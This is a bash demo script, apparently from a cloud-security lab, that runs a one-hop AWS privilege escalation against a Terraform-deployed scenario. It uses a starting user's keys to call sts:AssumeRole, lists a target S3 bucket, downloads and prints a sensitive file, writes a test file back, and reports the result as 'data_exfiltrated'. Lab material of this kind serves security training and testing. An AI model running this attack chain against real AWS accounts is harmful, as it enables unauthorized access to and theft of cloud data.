#!/bin/bash

# Demo script for sts:AssumeRole to S3 bucket access
# This script demonstrates how a user can assume a role to gain access to a sensitive S3 bucket

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
REGION="us-west-2"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}STS AssumeRole to S3 Bucket Access Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Disable paging for AWS CLI
export AWS_PAGER=""

# Navigate to the Terraform root directory (6 levels up from scenario directory)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TERRAFORM_ROOT="$(cd "$SCRIPT_DIR/../../../../../.." && pwd)"

echo -e "${YELLOW}Step 1: Retrieving credentials from Terraform outputs${NC}"
cd "$TERRAFORM_ROOT"

# Get the grouped module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_sts_001_sts_assumerole.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not retrieve module outputs. Make sure the scenario is deployed.${NC}"
    exit 1
fi

# Extract credentials and resource information from grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
BUCKET_ACCESS_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.bucket_access_role_arn')
TARGET_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.target_bucket_name')
STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')

echo -e "${GREEN}✅ Retrieved credentials for starting user: $STARTING_USER_NAME${NC}"
echo "📋 Bucket Access Role ARN: $BUCKET_ACCESS_ROLE_ARN"
echo "📋 Target Bucket: $TARGET_BUCKET_NAME"

# Set environment variables for starting user
export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
export AWS_DEFAULT_REGION="$REGION"
unset AWS_SESSION_TOKEN

echo -e "${GREEN}✓ Retrieved credentials${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 2: Get account ID and construct bucket name
echo -e "${YELLOW}Step 2: Getting account ID and bucket information${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"

# We already have the bucket name from Terraform outputs
BUCKET_NAME="$TARGET_BUCKET_NAME"
echo "Target bucket: $BUCKET_NAME"

# Test if starting user can list buckets (should not be able to)
if aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-prod-sts-001-to-bucket-')].Name" --output text 2>/dev/null | grep -q "pl-prod-sts-001-to-bucket"; then
    echo -e "${YELLOW}Note: Starting user can list buckets${NC}"
else
    echo -e "${GREEN}✓ Starting user cannot list buckets (expected)${NC}"
fi
echo -e "${GREEN}✓ Retrieved account information${NC}\n"

# Step 3: Verify limited permissions before role assumption
echo -e "${YELLOW}Step 3: Testing current permissions (should be limited)${NC}"
echo "Attempting to list S3 buckets..."
if aws s3 ls 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
    echo -e "${GREEN}✓ Confirmed limited permissions (cannot list S3 buckets)${NC}"
else
    echo -e "${YELLOW}Warning: May have more permissions than expected${NC}"
fi
echo ""

# Step 4: Assume the bucket access role
echo -e "${YELLOW}Step 4: Assuming role${NC}"
echo "Role ARN: $BUCKET_ACCESS_ROLE_ARN"

CREDENTIALS=$(aws sts assume-role \
    --role-arn $BUCKET_ACCESS_ROLE_ARN \
    --role-session-name demo-bucket-access-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')

# Verify we're now the role
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed role${NC}\n"

# Step 5: Verify we can now list buckets with the assumed role
echo -e "${YELLOW}Step 5: Verifying bucket access with assumed role${NC}"
echo "Target bucket: $BUCKET_NAME"
echo -e "${GREEN}✓ Ready to access target bucket${NC}\n"

# Step 6: List bucket contents
echo -e "${YELLOW}Step 6: Listing bucket contents${NC}"
echo "Contents of $BUCKET_NAME:"
aws s3 ls s3://$BUCKET_NAME/
echo -e "${GREEN}✓ Successfully listed bucket contents${NC}\n"

# Step 7: Download sensitive data
echo -e "${YELLOW}Step 7: Downloading sensitive data${NC}"
DOWNLOAD_FILE="/tmp/sensitive-data-${ACCOUNT_ID}.txt"
aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE

echo -e "\n${GREEN}✓ Successfully downloaded sensitive file${NC}"
echo -e "${YELLOW}Contents of sensitive file:${NC}"
cat $DOWNLOAD_FILE
echo ""

# Step 8: Verify write access (optional)
echo -e "${YELLOW}Step 8: Testing write access to bucket${NC}"
TEST_FILE="/tmp/test-write-${ACCOUNT_ID}.txt"
echo "Test file created during demo attack - $(date)" > $TEST_FILE
aws s3 cp $TEST_FILE s3://$BUCKET_NAME/demo-test-file.txt
echo -e "${GREEN}✓ Successfully wrote test file to bucket${NC}\n"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER_NAME${NC}"
echo -e "Step 1: Assumed role ${YELLOW}$(basename $BUCKET_ACCESS_ROLE_ARN)${NC}"
echo -e "Step 2: Gained access to ${YELLOW}$BUCKET_NAME${NC}"
echo -e "Step 3: Successfully ${GREEN}read and wrote${NC} sensitive data"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER_NAME → (AssumeRole) → $(basename $BUCKET_ACCESS_ROLE_ARN) → (S3 Access) → $BUCKET_NAME"
echo ""
echo -e "${GREEN}Downloaded file location: $DOWNLOAD_FILE${NC}"
echo ""

# Standardized test results output
echo "TEST_RESULT:prod_one_hop_to_bucket_sts_001_sts_assumerole:SUCCESS"
echo "TEST_DETAILS:prod_one_hop_to_bucket_sts_001_sts_assumerole:Successfully accessed S3 bucket via role assumption"
echo "TEST_METRICS:prod_one_hop_to_bucket_sts_001_sts_assumerole:role_assumed=true,bucket_accessed=true,data_exfiltrated=true"
echo ""

# Cleanup instructions
echo -e "${YELLOW}To clean up temporary files:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
